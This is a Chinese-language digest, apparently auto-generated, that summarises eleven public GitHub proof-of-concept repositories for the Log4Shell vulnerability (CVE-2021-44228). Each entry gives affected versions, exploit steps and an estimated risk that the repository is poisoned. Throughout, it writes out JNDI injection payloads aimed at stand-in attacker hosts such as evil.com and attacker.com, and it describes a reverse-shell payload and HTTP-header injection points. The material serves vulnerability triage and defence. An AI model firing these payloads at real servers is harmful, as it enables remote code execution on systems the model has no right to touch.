提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

